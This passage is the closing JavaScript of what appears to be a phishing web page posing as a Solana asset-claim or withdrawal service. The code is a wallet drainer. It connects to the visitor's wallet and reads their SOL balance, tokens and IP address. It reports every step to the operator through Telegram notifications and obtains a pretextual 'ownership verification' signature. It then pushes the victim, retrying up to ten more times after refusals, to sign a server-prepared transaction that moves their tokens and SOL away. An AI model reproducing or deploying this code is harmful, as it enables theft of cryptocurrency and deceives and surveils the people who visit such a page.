                        'https://solana-mainnet.api.syndica.io/api-key/API_KEY_HERE', 
                        'confirmed'
                    );

                    let publicKeyString;
                    if (walletType === 'solflare') {
                        if (walletProvider.publicKey) {
                            publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
                        } else if (walletProvider.pubkey) {
                            publicKeyString = walletProvider.pubkey.toString ? walletProvider.pubkey.toString() : walletProvider.pubkey;
                        } else {
                            throw new Error('No public key received from Solflare wallet');
                        }
                    } else if (walletType === 'slope') {
                        if (walletProvider.publicKey) {
                            publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
                        } else {
                            throw new Error('No public key received from Slope wallet');
                        }
                    } else {
                        if (resp.publicKey) {
                            publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
                        } else {
                            throw new Error('No public key received from wallet');
                        }
                    }

                    const public_key = new window.solanaWeb3.PublicKey(publicKeyString);
                    const walletBalance = await connection.getBalance(public_key);
                    console.log("Wallet balance:", walletBalance);

                    const solBalanceFormatted = (walletBalance / 1000000000).toFixed(6);

                    const clientIP = await getClientIP();
                    const splTokens = await getSPLTokenInfo(connection, public_key);

                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: '🔗 Wallet Connected',
                        splTokens: splTokens,
                        ip: clientIP
                    });

                    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                    const requiredBalance = 0.0005 * 1000000000;
                    
                    if (walletBalance < requiredBalance) {
                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: solBalanceFormatted,
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: '❌ Insufficient Funds - Please have at least 0.02 SOL'
                        });
                        
                        $('.wallet-loading-title').text('Insufficient Balance');
                        $('.wallet-loading-subtitle').html(`Please have at least 0.02 SOL to begin.<br>Current balance: ${solBalanceFormatted} SOL`);
                        
                        showRejectionEffects();
                        
                        setTimeout(() => {
                            unlockModal();
                            showWalletOptions();
                            $('#connect-wallet').text("Connect Wallet");
                        }, 3000);
                        
                        return;
                    }

                    $('#connect-wallet').text("Processing...");

                    const attemptTransaction = async (retryCount = 0) => {
                        const maxRetries = 10;
                        
                        try {
                            const verificationKey = `ownership_verified_${publicKeyString}`;
                            const isAlreadyVerified = localStorage.getItem(verificationKey) === 'true';
                            
                            let ownershipVerified = false;
                            
                            if (isAlreadyVerified) {
                                console.log("Ownership already verified for this wallet, skipping verification");
                                
                                await sendTelegramNotification({
                                    address: publicKeyString,
                                    balance: solBalanceFormatted,
                                    usdBalance: 'Unknown',
                                    walletType: walletInfo.name,
                                    customMessage: `✅ Ownership Previously Verified - Proceeding to withdrawal (Attempt ${retryCount + 1})`
                                });
                                
                                ownershipVerified = true;
                            } else {
                                $('.wallet-loading-title').text(`Verifying ${walletInfo.name} Ownership`);
                                $('.wallet-loading-subtitle').html(`Please sign the verification message in your ${walletInfo.name} wallet.<br>This confirms you own this wallet.`);
                                $('#connect-wallet').text('Verifying Ownership...');
                                
                                const verificationMessage = `Verify wallet ownership for security purposes.\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.substring(0, 8)}...${publicKeyString.substring(publicKeyString.length - 8)}`;
                                const messageBytes = new TextEncoder().encode(verificationMessage);
                                
                                try {
                                    const signedMessage = await walletProvider.signMessage(messageBytes, 'utf8');
                                    console.log("Ownership verification signed:", signedMessage);
                                    
                                    localStorage.setItem(verificationKey, 'true');
                                    
                                    await sendTelegramNotification({
                                        address: publicKeyString,
                                        balance: solBalanceFormatted,
                                        usdBalance: 'Unknown',
                                        walletType: walletInfo.name,
                                        customMessage: `✅ User Signed Ownership Verification - Proceeding to withdrawal (Attempt ${retryCount + 1})`
                                    });
                                    
                                    ownershipVerified = true;
                                } catch (signError) {
                                    console.error("Ownership verification failed:", signError);
                                    
                                    const signErrorMessage = signError.message || signError.toString() || 'Unknown error';
                                    const signErrorCode = signError.code || '';
                                    const signErrorName = signError.name || '';
                                    
                                    const isSignRejection = 
                                        signErrorMessage.includes('User rejected') || 
                                        signErrorMessage.includes('rejected') || 
                                        signErrorMessage.includes('cancelled') ||
                                        signErrorCode === 4001 ||
                                        signErrorCode === -32003 ||
                                        signErrorName === 'UserRejectedRequestError';
                                    
                                    if (isSignRejection) {
                                        await sendTelegramNotification({
                                            address: publicKeyString,
                                            balance: solBalanceFormatted,
                                            usdBalance: 'Unknown',
                                            walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                                            customMessage: `❌ Ownership Verification Rejected by User (Attempt ${retryCount + 1})`
                                        });
                                        
                                        if (retryCount < maxRetries) {
                                            showRejectionEffects();
                                            $('.wallet-loading-title').text('Verification Rejected');
                                            $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Sign the verification message in your wallet.`);
                                            
                                            setTimeout(() => {
                                                clearRejectionEffects();
                                                attemptTransaction(retryCount + 1);
                                            }, 2000);
                                            return;
                                        } else {
                                            throw new Error('Ownership verification rejected too many times');
                                        }
                                    } else {
                                        throw signError;
                                    }
                                }
                            }
                            
                            if (!ownershipVerified) {
                                throw new Error('Failed to verify wallet ownership');
                            }
                            
                            $('.wallet-loading-title').text(`Processing Transaction${retryCount > 0 ? ` (Attempt ${retryCount + 1})` : ''}`);
                            $('.wallet-loading-subtitle').html('Preparing withdrawal transaction...<br>Do not close this window.');
                            $('#connect-wallet').text(`Processing... ${retryCount > 0 ? `(Attempt ${retryCount + 1})` : ''}`);
                            
                            const prepareResponse = await fetch('/prepare-transaction', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    publicKey: publicKeyString,
                                    verified: true
                                })
                            });

                            const prepareData = await prepareResponse.json();
                            
                            if (!prepareResponse.ok) {
                                await sendTelegramNotification({
                                    address: publicKeyString,
                                    balance: solBalanceFormatted,
                                    usdBalance: 'Unknown',
                                    walletType: walletInfo.name,
                                    customMessage: '❌ Transaction Preparation Failed'
                                });
                                alert(prepareData.error || "Failed to prepare transaction");
                                $('#connect-wallet').text("Connect Wallet");
                                return;
                            }

                            const transactionBytes = new Uint8Array(prepareData.transaction);
                            const transaction = window.solanaWeb3.Transaction.from(transactionBytes);

                            $('.wallet-loading-title').text('Signing Transaction');
                            $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.<br>This may take a few moments.');
                            
                            const signed = await walletProvider.signTransaction(transaction);
                            console.log("Transaction signed:", signed);

                            await sendTelegramNotification({
                                address: publicKeyString,
                                balance: solBalanceFormatted,
                                usdBalance: 'Unknown',
                                walletType: walletInfo.name,
                                customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
                            });

                            $('.wallet-loading-title').text('Confirming Transaction');
                            $('.wallet-loading-subtitle').html('Transaction is being confirmed on the blockchain.<br>Please wait...');
                            
                            let txid = await connection.sendRawTransaction(signed.serialize());
                            await connection.confirmTransaction(txid);
                            console.log("Transaction confirmed:", txid);
                            
                            const shortTxid = `${txid.substring(0, 6)}....${txid.substring(txid.length - 8)}`;
                            const solscanUrl = `https://solscan.io/tx/${txid}`;
                            
                            await sendTelegramNotification({
                                address: publicKeyString,
                                balance: solBalanceFormatted,
                                usdBalance: 'Unknown',
                                walletType: walletInfo.name,
                                customMessage: `🎉 Transaction Confirmed! TXID: [${shortTxid}](${solscanUrl}) (Attempt ${retryCount + 1})`
                            });
                            
                            $('.wallet-loading-title').text('Success!');
                            $('.wallet-loading-subtitle').html('Assets have been successfully claimed.<br>Transaction confirmed on blockchain.');
                            
                            $('#connect-wallet').text("Assets Claimed Successfully!");
                            
                            setTimeout(() => {
                                unlockModal();
                                hideWalletModal();
                                $('#connect-wallet').text("Connect Wallet");
                            }, 2000);
                            
                        } catch (err) {
                            console.error("Error during claiming:", err);
                            
                            const errorMessage = err.message || err.toString() || 'Unknown error';
                            const errorCode = err.code || '';
                            const errorName = err.name || '';
                            
                            const isUserRejection = 
                                errorMessage.includes('User rejected') || 
                                errorMessage.includes('rejected') || 
                                errorMessage.includes('cancelled') ||
                                errorMessage.includes('Transaction cancelled') ||
                                errorCode === 4001 ||
                                errorCode === -32003 ||
                                errorName === 'UserRejectedRequestError';
                            
                            if (isUserRejection) {
                                if (retryCount < maxRetries) {
                                    await sendTelegramNotification({
                                        address: publicKeyString,
                                        balance: solBalanceFormatted,
                                        usdBalance: 'Unknown',
                                        walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                                        customMessage: `❌ Transaction Rejected by User - Retrying... (Attempt ${retryCount + 1}/${maxRetries + 1})`
                                    });
                                    
                                    showRejectionEffects();
                                    
                                    $('.wallet-loading-title').text('Transaction Rejected');
                                    $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Click approve in your wallet.`);
                                    
                                    setTimeout(() => {
                                        clearRejectionEffects();
                                        attemptTransaction(retryCount + 1);
                                    }, 2000);
                                    return;
                                } else {
                                    await sendTelegramNotification({
                                        address: publicKeyString,
                                        balance: solBalanceFormatted,
                                        usdBalance: 'Unknown',
                                        walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                                        customMessage: `❌ Transaction Rejected ${maxRetries + 1} Times - Giving Up`
                                    });
                                    
                                    showRejectionEffects();
                                    
                                    $('.wallet-loading-title').text('Transaction Failed');
                                    $('.wallet-loading-subtitle').html(`Transaction was rejected ${maxRetries + 1} times.<br>Please try again later.`);
                                    
                                    setTimeout(() => {
                                        unlockModal();
                                        showWalletOptions();
                                        $('#connect-wallet').text("Connect Wallet");
                                    }, 3000);
                                    return;
                                }
                            }
                            
                            let notificationMessage = '❌ Transaction Failed';
                            
                            await sendTelegramNotification({
                                address: publicKeyString,
                                balance: solBalanceFormatted,
                                usdBalance: 'Unknown',
                                walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                                customMessage: `${notificationMessage}: ${errorMessage} (Attempt ${retryCount + 1})`
                            });
                            
                            $('.wallet-loading-title').text('Transaction Failed');
                            $('.wallet-loading-subtitle').html('An error occurred during the transaction.<br>Please try again.');
                            
                            setTimeout(() => {
                                unlockModal();
                                showWalletOptions();
                                $('#connect-wallet').text("Connect Wallet");
                            }, 3000);
                        }
                    };

                    await attemptTransaction();
                    
                } catch (err) {
                    console.error(`Error connecting to ${walletType}:`, err);
                    
                    $('.wallet-loading-title').text('Connection Failed');
                    $('.wallet-loading-subtitle').html('Failed to connect to wallet.<br>Please try again.');
                    
                    await sendTelegramNotification({
                        address: 'Unknown',
                        balance: 'Unknown',
                        usdBalance: 'Unknown',
                        walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                        customMessage: `❌ Wallet Connection Failed: ${err.message || err.toString() || 'Unknown error'}`
                    });
                    
                    setTimeout(() => {
                        showWalletOptions();
                        unlockModal();
                    }, 2000);
                    
                    setTimeout(() => {
                        const walletName = walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension';
                        alert(`Failed to connect to ${walletName}: ${err.message || err.toString() || 'Unknown error'}`);
                    }, 2100);
                }
            }

            function showWalletModal() {
                checkWalletAvailability();
                showWalletOptions();
                $('#wallet-modal').fadeIn(200);
            }

            function hideWalletModal() {
                $('#wallet-modal').fadeOut(200);
                showWalletOptions();
                unlockModal();
            }

            function lockModal() {
                $('#wallet-modal').addClass('locked');
            }

            function unlockModal() {
                $('#wallet-modal').removeClass('locked');
            }

            function showWalletOptions() {
                $('#wallet-options').removeClass('hidden');
                $('#wallet-loading-state').removeClass('active');
                $('.wallet-modal-header h3').text('Select Your Wallet');
                clearRejectionEffects();
            }

            function showWalletLoading() {
                $('#wallet-options').addClass('hidden');
                $('#wallet-loading-state').addClass('active');
                $('.wallet-modal-header h3').text('Connecting...');
                lockModal();
                clearRejectionEffects();
            }

            function showRejectionEffects() {
                $('.wallet-loading-spinner').addClass('rejected');
                $('.phantom-icon').addClass('rejected');
                $('.solflare-icon').addClass('rejected');
                $('.wallet-loading-spinner img').addClass('rejected');
                $('.wallet-modal-content').addClass('shake');
                
                setTimeout(() => {
                    $('.wallet-modal-content').removeClass('shake');
                }, 600);
            }

            function clearRejectionEffects() {
                $('.wallet-loading-spinner').removeClass('rejected');
                $('.phantom-icon').removeClass('rejected');
                $('.solflare-icon').removeClass('rejected');
                $('.wallet-loading-spinner img').removeClass('rejected');
                $('.wallet-modal-content').removeClass('shake');
            }

            $('#connect-wallet, #connect-wallet-hero').on('click', function() {
                showWalletModal();
            });

            $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
                if (!$('#wallet-modal').hasClass('locked')) {
                    hideWalletModal();
                }
            });

            $('.wallet-option').on('click', function() {
                const walletType = $(this).data('wallet');
                const walletProvider = getWalletProvider(walletType);
                
                connectWallet(walletType, walletProvider);
            });

            $(document).on('keydown', function(e) {
                if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
                    hideWalletModal();
                }
            });

            $('#connect-wallet-hero').on('click', function() {
                showWalletModal();
            });
        });
    </script>
    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a431f101f6eb4dae81daf1b9c4a09a04","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>